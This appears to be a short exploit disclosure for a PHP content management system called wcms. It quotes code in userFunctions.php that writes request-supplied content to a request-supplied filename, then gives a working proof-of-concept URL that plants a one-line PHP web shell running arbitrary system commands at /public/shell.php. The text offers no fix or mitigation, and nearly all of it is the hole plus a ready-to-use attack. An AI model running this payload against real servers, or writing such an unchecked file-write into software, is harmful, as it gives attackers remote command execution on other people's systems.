 
    
  6. switch($_REQUEST[&#039;udef&#039;]) // user defined function
         ...
 11. case &#039;activity&#039;: procActivity(); // <-- call procActivity Function
         ...
254. function procActivity()
255. {
256.    $type    = $_REQUEST[&#039;type&#039;]; // <-- type
257.    $content = $_REQUEST[&#039;content&#039;]; // <-- content
259.    $data = explode("\n",@file_get_contents("./public/$type")); 
260.    $file = @fopen("./public/$type", "w"); // <-- filename = $type
261.    if($file);
262.    {
263.        fwrite($file, $content); // <-- fwrite to write $content into $filename
264.        for($ix=0;$ix<25;$ix++)
265.        {
266.            fwrite($file,$data[$ix]."\n");
267.        }
268.        fclose($file);
269.    }
     
---> Exploit/Proof of Concept (PoC)
  
http://localhost/wcms/userFunctions.php?udef=activity&type=shell.php&content=<?php system($_GET[&#039;cmd&#039;]); ?>
  
Find your shell on /public/shell.php

